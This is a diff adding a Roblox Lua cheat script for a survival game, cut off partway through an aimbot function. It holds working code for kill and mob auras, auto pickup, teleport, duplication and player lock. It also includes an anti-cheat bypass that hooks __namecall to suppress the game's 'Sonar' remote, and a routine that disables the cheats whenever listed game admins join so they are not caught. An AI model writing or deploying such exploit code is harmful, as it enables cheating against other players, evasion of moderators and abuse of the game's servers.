+    [185] = "Grinch's Sleigh",
+    [186] = "Candy Bag",
+    [187] = "Pile of Candy",
+    [188] = "Candy Pack",
+    [189] = "Explorer Energy",
+    [190] = "Cave Door Key (d)",
+    [191] = "Key Handle (d)",
+    [192] = "Key Shaft (d)",
+    [193] = "Cave Door Key (z)",
+    [194] = "Key Handle (z)",
+    [195] = "Key Shaft (z)",
+    [196] = "Stone Anvil",
+    [197] = "Silver Crossbow",
+    [198] = "Diamond Crossbow",
+    [199] = "Zenyte Crossbow",
+    [200] = "Soul",
+    [201] = "Soul Helmet",
+    [202] = "Soul Body",
+    [203] = "Soul Legs",
+    [204] = "Soul Boots",
+    [205] = "Zenyte Sword",
+    [206] = "Wooden Shield",
+    [207] = "Silver Shield",
+    [208] = "Golden Shield",
+    [209] = "Ruby Shield",
+    [210] = "Diamond Shield",
+    [211] = "Zenyte Shield",
+    [212] = "Golden Anvil",
+    [213] = "Diamond Anvil",
+    [214] = "Cave Key Pack",
+    [215] = "OP Sword",
+    [216] = "Soul Sword",
+    [217] = "Soul Bag",
+    [218] = "Soul Shield",
+    [219] = "Lucky Shield",
+    [220] = "Soul Key",
+    [221] = "Pirate Ship",
+    [222] = "Springy Boots",
+    [223] = "Volcanic Ore",
+    [224] = "Obsidian",
+    [225] = "Obsidian Helmet",
+    [226] = "Obsidian Body",
+    [227] = "Obsidian Legs",
+    [228] = "Obsidian Boots",
+    [229] = "Volcanic Furnace",
+    [230] = "Obsidian Club",
+    [231] = "Obsidian Wall",
+    [232] = "Obsidian Gate",
+    [233] = "Obsidian Storage Chest",
+    [234] = "Harpoon Turret",
+    [235] = "Obsidian Shield",
+    [236] = "Obsidian Bag",
+    [237] = "Instakill Sword",
+    [238] = "Pearl Helmet",
+    [239] = "Pearl Body",
+    [240] = "Pearl Legs",
+    [241] = "Pearl Boots",
+    [242] = "Raw Seaweed",
+    [243] = "Cooked Seaweed",
+    [244] = "Pink Shell",
+    [245] = "White Shell",
+    [246] = "Orange Shell",
+    [247] = "Pearl",
+    [248] = "Seaglass",
+    [249] = "Seaglass Helmet",
+    [250] = "Seaglass Body",
+    [251] = "Seaglass Legs",
+    [252] = "Seaglass Boots",
+    [253] = "White Shell Sword",
+    [254] = "Pink Shell Sword",
+    [255] = "Orange Shell Sword",
+    [256] = "White Shell Harvester",
+    [257] = "Pink Shell Harvester",
+    [258] = "Orange Shell Harvester",
+    [259] = "Shell Helmet",
+    [260] = "Shell Body",
+    [261] = "Shell Legs",
+    [262] = "Flippers",
+    [263] = "Poison Seaweed",
+    [264] = "Stone Trap",
+    [265] = "Ruby Trap",
+    [266] = "Zenyte Trap",
+    [267] = "Pink Egg",
+    [268] = "Purple Egg",
+    [269] = "Red Egg",
+    [270] = "Yellow Egg",
+    [271] = "Easter Candy",
+    [272] = "Easter Glider",
+    [273] = "Repairio Spellbook",
+    [274] = "Warrior Energy",
+    [275] = "Protector Energy",
+    [276] = "Magic Portal",
+    [277] = "Healing Aura",
+    [278] = "Electric Aura",
+    [279] = "Hunger Aura",
+    [280] = "Book of Exploration (I)",
+    [281] = "Book of Exploration (II)",
+    [282] = "Book of Exploration (III)",
+    [283] = "Book of Protection (I)",
+    [284] = "Book of Protection (II)",
+    [285] = "Book of Protection (III)",
+    [286] = "Book of Combat (I)",
+    [287] = "Book of Combat (II)",
+    [288] = "Book of Combat (III)",
+    [289] = "Apprentice Wand",
+    [290] = "Adept Staff",
+    [291] = "Master Staff",
+    [292] = "Transcended Staff",
+    [293] = "Visionary Staff",
+    [294] = "Wool",
+    [295] = "Book",
+    [296] = "Magical Book",
+    [297] = "Obsidian Harvester",
+    [298] = "Magic Repair Table (I)",
+    [299] = "Magic Repair Table (II)",
+    [300] = "Magic Repair Table (III)",
+    [301] = "Glider",
+    [302] = "Imbue Spellbook",
+    [303] = "Shieldio Spellbook",
+    [304] = "Hungaria Spellbook",
+    [305] = "Baseio Retreatio Spellbook",
+    [306] = "Healia Spellbook",
+    [307] = "Deadia Protectia Spellbook",
+    [308] = "Baseio Destroyio Spellbook",
+    [309] = "Oofio Spellbook",
+    [310] = "Freezio Spellbook",
+    [311] = "Starvio Spellbook",
+    [312] = "Electricia Spellbook",
+    [313] = "Portalio Spellbook",
+    [314] = "Protectio Claimio Spellbook",
+    [315] = "Warrio Claimio Spellbook",
+    [316] = "Explorer Energy Pack",
+    [317] = "Protector Energy Pack",
+    [318] = "Warrior Energy Pack",
+    [319] = "Explorer Energy Stack",
+    [320] = "Protector Energy Stack",
+    [321] = "Warrior Energy Stack",
+    [322] = "Infinite Bag",
+    [323] = "Deflectio Projectio Spellbook",
+    [324] = "Seed Pack",
+    [325] = "Fruit Pack",
+    [326] = "Diamond Hero Pack",
+    [327] = "Zenyte Warrior Pack",
+    [328] = "Box of Redberries",
+    [329] = "Box of Coconuts",
+    [330] = "Box of Bananas",
+    [331] = "Box of Watermelons",
+    [332] = "Potato Seed Box",
+    [333] = "Cabbage Seed Box",
+    [334] = "Carrot Seed Box",
+    [335] = "Watermelon Seed Box",
+    [336] = "Halloween Pumpkin",
+    [337] = "Jack-o'-lantern",
+    [338] = "Weak Pet Net",
+    [339] = "Sturdy Pet Net",
+    [340] = "Strong Pet Net",
+    [341] = "Unbreakable Pet Net",
+    [342] = "Christmas Present",
+    [343] = "Snowball",
+    [344] = "Obsidian Floor",
+    [345] = "Pile of Snowballs",
+    [346] = "Snowball Pack",
+    [347] = "Silver Snowball",
+    [348] = "Golden Snowball",
+    [349] = "Ruby Snowball",
+    [350] = "Diamond Snowball",
+    [351] = "Zenyte Snowball",
+    [352] = "Obsidian Snowball",
+    [353] = "Candy Snowball",
+    [354] = "Starter Sword",
+    [355] = "Starter Harvester",
+    [356] = "Starter Helmet",
+    [357] = "Starter Body",
+    [358] = "Starter Legs",
+    [359] = "Starter Boots",
+    [360] = "Lunar Ore",
+    [361] = "Moonstone",
+    [362] = "Lunario Enchantio Spellbook",
+    [363] = "Moonstone Helmet",
+    [364] = "Moonstone Body",
+    [365] = "Moonstone Legs",
+    [366] = "Moonstone Boots",
+    [367] = "Moonstone Shield",
+    [368] = "Moonstone Harvester",
+    [369] = "Moonstone Sword",
+    [370] = "Moonstone Bag",
+    [371] = "Potion Cauldron",
+    [372] = "Candy Potion",
+    [373] = "Moonstone Storage Chest",
+    [374] = "Moonstone Wall",
+    [375] = "Moonstone Gate",
+    [376] = "Moonstone Crossbow",
+    [377] = "Lunar Arrow",
+    [378] = "Pumpkin",
+    [379] = "Pumpkin Shield",
+    [380] = "Pumpkin Bag",
+    [381] = "Pumpkin Seeds",
+    [382] = "Treasure Chest Pack",
+
+
+}
+
+
+
+ALLITEMSTABLE = ALLITEMS
+SWITCHEDITEMSTABLE = {}
+for id, name in pairs(ALLITEMS) do
+    ALLITEMSTABLE[id] = name      -- Maps the numeric ID to the item name
+    SWITCHEDITEMSTABLE[name] = id -- Maps the item name back to the numeric ID
+end
+getgenv().configs = {
+    Bypassing = false;
+    AutoPickup2 = false;
+    InfJump = false;
+    ClickTp = false;
+    AutoEat = false;
+    MineAura = false;
+    MobAura = false;
+    CheaterDetector = false;
+    KillAura = false;
+    PlayerLock = false;
+    Pumpkins = false;
+    Hitbox = false;
+    SafeDeath = false;
+    OpKillAura = false;
+	PredictOpKillAura = false;
+    AutoRepairClub = false;
+    ConiferFarm = false;
+    UseSoulKeys = false;
+    ObsidianBoss = false;
+    ZenLuckBoss = false;
+    SpiritBoss = false;
+    LuckySlime = false;
+    EvilSkeleton = false;
+    Ogre = false;
+    Squid = false;
+    JumpPower = false;
+    AntiRagDoll = false;
+    ExtraSpeed = false;
+    AmountToLoopDrop = false;
+    PlayerEsp = false;
+    EatingType = 'AFK';
+    TrapType = 'Stone Trap';
+    LevelCheck = 'True';
+    ChestType = 'Any';
+}
+getgenv().QuickSpeedMultiplier = 1
+getgenv().AmountOfChestInserts = 1
+getgenv().PredictAmount = 3
+getgenv().QuickSpeedKey = Enum.KeyCode.B
+getgenv().GliderModSpeed = 30
+
+
+--RemoteEvents
+RemoteEvents = {
+    ToolAction = ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('ToolAction');
+    InventoryInteraction =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("InventoryInteraction");
+    UpdateStorageChest =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("UpdateStorageChest");
+    SetSettings = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("SetSettings");
+    BuyWorldEvent =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("BuyWorldEvent");
+    ItemInteracted =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("ItemInteracted");
+    CraftItem =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("CraftItem");
+    TradeTrader =  ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("TradeTrader");
+    KeyDoor = ReplicatedStorage:WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("KeyDoor");
+    Sonar =  ReplicatedStorage:WaitForChild('References'):WaitForChild('Comm'):WaitForChild('Events'):WaitForChild('Sonar');
+}
+--Important locals
+local MyInventory = LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Menus'):FindFirstChild('Inventory'):FindFirstChild('Inventory'):FindFirstChild('List')
+local Whitelist_table = {};
+local OpKillAuraTable = {};
+local realgameadmins = {849400193, 134488231, 146733116, 27865601}
+local MoonstoneSet = {363, 364, 365, 366}
+local ObsidianSet = {225, 226, 227, 228}
+local AllShields = {206, 207, 208, 209, 210, 211, 219, 235, 367, 379}
+local AllSwords = {173, 205, 230, 369, 255, 254, 253}
+local AllBows = {174, 197, 198, 199, 376}
+local AllBooks = {281, 282, 283, 284, 285, 286, 287, 296, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 323, 362}
+local AllStaffs = {293, 292, 291, 290, 162, 289}
+
+--Safe Death Connections
+local TimeTped
+local TimeBetweenTps
+local TeleportHappened = false
+local SafeDeathHealthChecker = nil
+
+--Boss Death connections
+local AutoPickupOnObsidianDeath
+local AutoPickupOnZenLuckBossDeath
+local AutoPickupOnSpiritBossDeath
+local AutoPickuponLuckySlimeDeath
+local AutoPickupOnSkeletonDeath
+local AutoPickupOnOgreDeath
+local AutoPickupOnSquidDeath
+
+--Dupe locals
+local ItemIndexed
+local ItemIndexedNumber
+
+--Admin Module
+local Players = game:GetService("Players")
+
+-- Define a list of admin user IDs
+local adminUserIDs = {
+    -- Add user IDs of admins here
+    162080939,  -- Replace with actual user IDs
+    987654321,
+}
+
+-- Function to check if a player is an admin
+local function isAdmin(player)
+    return table.find(adminUserIDs, player.UserId) ~= nil
+end
+
+-- Function to kill a player
+local function killPlayer(player)
+    local Character = GetCharacter(player.name)
+    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+    end
+end
+
+-- Function to kick a player
+local function kickPlayer(player, targetPlayer)
+    if targetPlayer and targetPlayer ~= player then
+        targetPlayer:Kick("You have been kicked by an admin.")
+    end
+end
+
+-- Function to freeze a player
+local function freezePlayer(player)
+    local character = GetCharacter(player.name)
+
+    if character then
+        local rootPart = character:FindFirstChild("HumanoidRootPart")
+        if rootPart then
+            rootPart.Anchored = true
+        end
+    end
+end
+
+-- Function to unfreeze a player
+local function unfreezePlayer(player)
+    local character = GetCharacter(player.name)
+    if character then
+        local rootPart = character:FindFirstChild("HumanoidRootPart")
+        if rootPart then
+            rootPart.Anchored = false
+        end
+    end
+end
+
+-- Function to handle player chat and check for admin commands
+local function onPlayerChat(player, message)
+    if isAdmin(player) then
+        if message:lower():sub(1, 5) == ".kill" then
+            local playerNameToKill = message:sub(7)
+            local targetPlayer = Players:FindFirstChild(playerNameToKill)
+            killPlayer(targetPlayer)
+        elseif message:lower():sub(1, 5) == ".kick" then
+            local playerNameToKick = message:sub(7)
+            local targetPlayer = Players:FindFirstChild(playerNameToKick)
+            kickPlayer(player, targetPlayer)
+        elseif message:lower():sub(1, 7) == ".freeze" then
+            local playerNameToFreeze = message:sub(9)
+            local targetPlayer = Players:FindFirstChild(playerNameToFreeze)
+            freezePlayer(targetPlayer)
+        elseif message:lower():sub(1, 9) == ".unfreeze" then
+            local playerNameToUnfreeze = message:sub(11)
+            local targetPlayer = Players:FindFirstChild(playerNameToUnfreeze)
+            unfreezePlayer(targetPlayer)
+        -- Add more admin commands here
+        end
+    end
+end
+
+-- Listen for chat messages from all players
+for _, player in pairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        onPlayerChat(player, msg)
+    end)
+end
+
+-- Listen for new players and their chat messages
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        onPlayerChat(player, msg)
+    end)
+end)
+
+--Aimbot locals
+local CurrentlyLocked
+local Aiming = false
+
+--Quickspeed locals
+local OnOff = false
+local keydetected
+
+--Pages
+local Main = AtlasUi:CreatePage("Main")
+
+local Combat = AtlasUi:CreatePage("Combat")
+
+local Farming = AtlasUi:CreatePage("Farm")
+
+local Teleports = AtlasUi:CreatePage("Teleports")
+
+local OtherStuff = AtlasUi:CreatePage("Resources")
+
+local Chests = AtlasUi:CreatePage("Treasure Chests")
+
+local LPlayer = AtlasUi:CreatePage("LocalPlayer")
+
+local Dupe = AtlasUi:CreatePage("Dupe")
+
+local AutoSell = AtlasUi:CreatePage("AutoSell")
+
+local Visuals = AtlasUi:CreatePage("Visuals")
+
+local Credits = AtlasUi:CreatePage("Credits")
+
+--stop everything if an admin joins
+Players.PlayerAdded:Connect(function(admin)
+    if table.find(realgameadmins, admin.UserId) then
+        if admin.UserId == '134488231' then
+            MakeAtlasNotification('Owner Joined', "Owner joined; carefull, ill disable everything for you", 30)
+        else
+            MakeAtlasNotification("Game Admin Joined: "..admin.Name, "Admin joined; carefull, ill disable everything for you", 30)
+        end
+        task.spawn(function()
+            repeat task.wait(1)
+                for setting, value in pairs(getgenv().configs) do
+                    if type(value) == 'boolean' then
+                        getgenv().configs[setting] = false
+                    end
+                end
+            until not Players:FindFirstChild(admin.Name)
+            if admin.UserId == '134488231' then
+                MakeAtlasNotification('Owner left', "Interesting interaction", 30)
+            else
+                MakeAtlasNotification('Admin left', "Ok the admin is gone.", 15)
+            end
+        end)
+    end
+end)
+
+--setup ac bypass
+if not getgenv().bypassing then
+    getgenv().bypassing = true
+    local bypassac
+
+    bypassac = hookmetamethod(game, '__namecall', function(self, ...)
+        local args = {...}
+        if not checkcaller() and self == RemoteEvents['Sonar'] then
+            return nil
+        end
+        return bypassac(self, ...)
+    end) 
+end
+
+--Antiafk
+if not getgenv().Idling ~= true then
+    getgenv().Idling = true
+    LocalPlayer.Idled:connect(function()
+	    VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+	    task.wait(1)
+	    VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+    end)
+end
+
+--Functions
+function IsPlayerAlive(player)
+    if player.Character and player.Character:FindFirstChild('Humanoid') and player.Character:FindFirstChild('HumanoidRootPart') and player.Character:FindFirstChild('Humanoid').Health > 0 then
+        return true
+    end
+    return false
+end
+
+
+function GetClosestChest()
+    local closest
+    local range = math.huge
+    local checkpassivenonpassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
+    if IsPlayerAlive(LocalPlayer) then
+        for _, chest in pairs(Workspace:WaitForChild("Replicators")[checkpassivenonpassive]:GetChildren()) do
+            if string.find(chest.Name, 'Storage') and chest:FindFirstChildOfClass('MeshPart') then
+                local dist = (LocalPlayer.Character:WaitForChild('HumanoidRootPart').Position - chest:FindFirstChildOfClass('MeshPart').Position).magnitude
+                if dist < range then
+                    range = dist
+                    closest = chest
+                end
+            end
+        end
+        return closest
+    end
+end
+
+local function IsArmorLevel(piece)
+    if getgenv().LevelCheck == 'False' then return true end
+    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
+    if tonumber(lvl) == 10 then
+        return true
+    end
+end
+
+local function IsLevel(piece)
+    if getgenv().LevelCheck == 'False' then return true end
+    local lvl = piece:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Level'):FindFirstChild('Label').Text:gsub("Lv ", "")
+    if tonumber(lvl) == 5 then
+        return true
+    end
+end
+
+local function SellItem(Item, SellAmount, Id)
+    local GetItem = MyInventory:FindFirstChild(Item)
+    if GetItem then
+        local NumberOfItem = string.match(GetItem:FindFirstChild('Top'):FindFirstChild('NameLabel').Text, '%d+')
+        if not NumberOfItem then
+            NumberOfItem = 1
+        end
+        if tonumber(NumberOfItem) >= SellAmount then
+            RemoteEvents['TradeTrader']:FireServer('Resource Trader', Id)
+        end
+    end
+end
+
+function AutoPickup()
+    local checkpassivenonpassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
+    if IsPlayerAlive(LocalPlayer) then
+        local AllPickups = {}
+        local mypos = LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position
+        for _, item in pairs(Workspace:WaitForChild('Replicators')[checkpassivenonpassive]:GetChildren()) do
+            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
+                if table.find(ALLITEMSTABLE, item.Name) then
+                    table.insert(AllPickups, item)
+                end
+            end
+        end
+        for _, item in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
+            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
+                if table.find(ALLITEMSTABLE, item.Name) then
+                    table.insert(AllPickups, item)
+                end
+            end
+        end
+        for _, item in pairs(Workspace:GetChildren()) do
+            if item:IsA("Model") and (mypos - item:GetPivot().Position).magnitude < 18.5 and not string.find(item.Name:lower(), 'clue') then
+                if table.find(ALLITEMSTABLE, item.Name) then
+                    table.insert(AllPickups, item)
+                end
+            end
+        end
+        if #AllPickups > 0 then
+            for _, getitem in ipairs(AllPickups) do
+                repeat task.wait()
+					local mybagspace = string.split(LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Bag'):WaitForChild('StatusLabel').Text, '/')
+					if tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) then return false end 
+                    if IsPlayerAlive(LocalPlayer) then
+                        if getitem.Parent then
+                            RemoteEvents['ItemInteracted']:FireServer(getitem, "Pickup")
+                        end
+                    end
+                until not getitem.Parent or (LocalPlayer.Character.HumanoidRootPart.Position - getitem:GetPivot().Position).magnitude > 18.5 or tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) or not IsPlayerAlive(LocalPlayer)
+            end
+        end
+    end
+end
+
+function AutoPickup2()
+    if getgenv().configs.AutoPickup2 then
+        if not getgenv().AutoPickingUp then
+            getgenv().AutoPickingUp = Workspace.DescendantAdded:Connect(function(pickup)
+				local mybagspace
+                if not getgenv().configs.AutoPickup2 then
+                    getgenv().AutoPickingUp:Disconnect()
+                    getgenv().AutoPickingUp = nil
+                    return
+                end
+                if not string.find(pickup.Name:lower(), 'clue') then
+                    if table.find(ALLITEMSTABLE, pickup.Name) then
+                        if IsPlayerAlive(LocalPlayer) then
+                            local mypos = LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position
+                            local itempos = pickup:GetPivot().Position
+                            if (mypos - itempos).magnitude < 18.5 then
+                                repeat task.wait()
+									mybagspace = string.split(LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Bag'):WaitForChild('StatusLabel').Text, '/') 
+                                    if IsPlayerAlive(LocalPlayer) then
+                                        if pickup.Parent then
+                                            RemoteEvents['ItemInteracted']:FireServer(pickup, "Pickup")
+                                        end
+                                    end
+                                until not pickup.Parent or (LocalPlayer.Character.HumanoidRootPart.Position - pickup:GetPivot().Position).magnitude > 18.5 or tonumber(mybagspace[1])+1 >= tonumber(mybagspace[2]) or not IsPlayerAlive(LocalPlayer) or not getgenv().configs.AutoPickup2
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+        AutoPickup()
+    else
+        if getgenv().AutoPickingUp then
+            getgenv().AutoPickingUp:Disconnect()
+            getgenv().AutoPickingUp = nil
+        end
+    end
+end
+
+function ClickTp()
+    if getgenv().configs.ClickTp then
+        if not getgenv().MouseClick then
+            getgenv().MouseClick = UserInputService.InputBegan:Connect(function(input)
+                if getgenv().configs.ClickTp then
+                    if not UserInputService:GetFocusedTextBox() then
+                        if input.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
+                            if IsPlayerAlive(LocalPlayer) then
+                                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.Position)
+                            end
+                        end
+                    end
+                end
+            end)
+        end
+    end
+end
+
+function AutoEat()
+    local function GreatestFoodSource()
+        local foodtable = {}
+        local highestfood
+        local greatestfoodpossible = -math.huge
+        
+        for _, food in pairs(MyInventory:GetChildren()) do
+            if food.Name == 'Raw Potato' or food.Name == 'Watermelon' or food.Name == 'Banana' or food.Name == 'Redberry' or food.Name == 'Coconut' or food.Name == 'Baked Potato' or food.Name == 'Carrot'  or food.Name == 'Cabbage' or food.Name == 'Cooked Fish' or food.Name == 'Cooked Meat' or food.Name == 'Caveberry' or food.Name == 'Slime Ball' or food.Name == 'Lucky Fruit' then
+                table.insert(foodtable, food)
+            end
+        end
+        for _, food in pairs(foodtable) do
+            local foodamount = tonumber(string.match(food:WaitForChild('Top'):WaitForChild('NameLabel').Text, '%d+'))
+            if foodamount and foodamount > greatestfoodpossible then
+                greatestfoodpossible = foodamount
+                highestfood = food.Name
+            end
+        end
+        return highestfood
+    end
+    local maxhungerbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Hunger'):WaitForChild('Bar').AbsoluteSize
+    local subbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Health'):WaitForChild('Bar'):WaitForChild('Sub')
+    while getgenv().configs.AutoEat do
+        if getgenv().configs.AutoEat then
+            task.wait()
+            local Food = GreatestFoodSource()
+            if Food then
+                if getgenv().configs.EatingType == 'AFK' then
+                    local currenthungerbar = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('HUD'):WaitForChild('Status'):WaitForChild('Content'):WaitForChild('Hunger'):WaitForChild('Bar'):WaitForChild('Bar').AbsoluteSize
+                    if IsPlayerAlive(LocalPlayer) then
+                        if (maxhungerbar - currenthungerbar).magnitude >= 20.7 then
+                            RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[Food], 'Eat')
+                            task.wait()
+                        end
+                    end
+                elseif getgenv().configs.EatingType == 'War' then
+                    local maxsubbar = subbar.Parent.AbsoluteSize
+                    if IsPlayerAlive(LocalPlayer) then
+                        if (maxsubbar - subbar.AbsoluteSize).magnitude >= 20.7 then
+                            RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[Food], 'Eat')
+                            task.wait()
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+function MineAura()
+    while getgenv().configs.MineAura do
+        if getgenv().configs.MineAura then
+            task.wait(0.3)
+            if IsPlayerAlive(LocalPlayer) then
+                local function getclosestore()
+                    local range = 21
+                    local closestore
+                    for _, ore in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
+                        if not string.find(ore.Name:lower(), 'slime') then
+                            if Workspace:FindFirstChild("Volcanic Rock") then
+                                Workspace:FindFirstChild("Volcanic Rock").Parent = Workspace:WaitForChild('Replicators'):WaitForChild('Both')
+                            end
+                            if ore:FindFirstChild('Health') and not ore:FindFirstChild('Humanoid') and not ore:FindFirstChild('HumanoidRootPart') then
+                                local obj
+                                local dist
+                                obj = ore:GetPivot().Position
+                                local mypos = LocalPlayer.Character.HumanoidRootPart.Position
+                                dist = (mypos - obj).magnitude
+                                if dist < range then
+                                    if ore.Name == 'Plantain' then
+                                        if ore:FindFirstChild('Tree') and ore:FindFirstChild('Tree'):FindFirstChild('Palm Tree_Trunk') then
+                                            obj = Vector3.new(3378, 15, -4475)
+                                        end
+                                    end
+                                    dist = (mypos - obj).magnitude
+                                    range = dist
+                                    closestore = ore
+                                end
+                            end
+                        end
+                    end
+                    return closestore
+                end
+                local NearestOre = getclosestore()
+                if NearestOre then
+                    RemoteEvents['ToolAction']:FireServer(NearestOre)
+                end
+            end
+        end
+    end
+end
+
+function MobAura()
+    while getgenv().configs.MobAura do
+        if getgenv().configs.MobAura then
+            task.wait(.15)
+            local function getclosestmob()
+                local range = 30
+                local closestmob = nil
+                if IsPlayerAlive(LocalPlayer) then
+                    for _, mob in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
+                        if mob:FindFirstChild('HumanoidRootPart') and mob:FindFirstChild('Humanoid') and mob:FindFirstChild('Humanoid').Health > 0 then
+                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
+                            local mobpos = mob.HumanoidRootPart.Position
+                            local dist = (mypos - mobpos).magnitude
+                            if dist < range then
+                                range = dist
+                                closestmob = mob
+                            end
+                        end
+                    end
+                end
+                return closestmob
+            end
+            local nearestmob = getclosestmob()
+            if nearestmob then
+                RemoteEvents['ToolAction']:FireServer(nearestmob)
+            end
+        end
+    end
+end
+
+function KillAura()
+    while getgenv().configs.KillAura do
+        if getgenv().configs.KillAura then
+            task.wait()
+            local function GetClosestKAPlayer()
+                local range = 32
+                local closest
+                for _, plr in pairs(Players:GetPlayers()) do
+                    if plr ~= LocalPlayer then
+                        if not table.find(Whitelist_table, plr.Name) then
+                            if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
+                                local char = plr.Character
+                                if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
+                                    if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
+                                        local mypos = LocalPlayer.Character.HumanoidRootPart.Position
+                                        local plrpos = plr.Character.HumanoidRootPart.Position
+                                        local dist = (mypos - plrpos).magnitude
+                                        if dist < range then
+                                            range = dist
+                                            closest = plr.Character
+                                        end
+                                    else
+                                        if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
+                                            local mypos = LocalPlayer.Character.HumanoidRootPart.Position
+                                            local plrpos = plr.Character.HumanoidRootPart.Position
+                                            local dist = (mypos - plrpos).magnitude
+                                            if dist < range then
+                                                range = dist
+                                                closest = plr.Character
+                                            end
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+                return closest
+            end
+            local NearestPlayer = GetClosestKAPlayer()
+            if NearestPlayer then
+                RemoteEvents['ToolAction']:FireServer(NearestPlayer)
+            end
+        end
+    end
+end
+
+function PlayerLock()
+    local function Wallcheck(target)
+        local ray = Ray.new(Camera.CFrame.Position, (target.Position - Camera.CFrame.Position).Unit * 1000)
+        local part, position = Workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character}, false, true)
+        if part then
+            local humanoid = part.Parent:FindFirstChildOfClass('Humanoid')
+            if not humanoid then
+                humanoid = part.Parent.Parent:FindFirstChildOfClass('Humanoid')
+            end
+            if humanoid and target and humanoid.Parent == target.Parent then
+                local pos, visible = Camera:WorldToScreenPoint(target.Position)
+                if visible then
+                    return true
+                end
+            end
+        end
+        return false
+    end
+    local function GetNearestPlayerToMouse()
+        if CurrentlyLocked and CurrentlyLocked.Humanoid.Health > 0 then return CurrentlyLocked end
+        local dist = 150
+        local closest
+        for _, plr in pairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer then
+                if IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
+                    local char = plr.Character
+                    local plrpos, onscreen = Camera:WorldToViewportPoint(char['HumanoidRootPart'].Position)
+                    if onscreen then
+                        if char:FindFirstChild("PlayerBillboard") and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title') and char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon') then
+                            if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 == Color3.fromRGB(80, 63, 47) then
+                                local mag = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(plrpos.X, plrpos.Y)).Magnitude
+                                if mag < dist and (char.HumanoidRootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).magnitude < dist then
+                                    if Wallcheck(char:FindFirstChild('HumanoidRootPart')) then
+                                        dist = mag
+                                        closest = char
+                                    end
+                                end
+                            else
+                                if char:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 ~= LocalPlayer.Character:FindFirstChild('PlayerBillboard'):FindFirstChild('Title'):FindFirstChild('Icon').BackgroundColor3 then
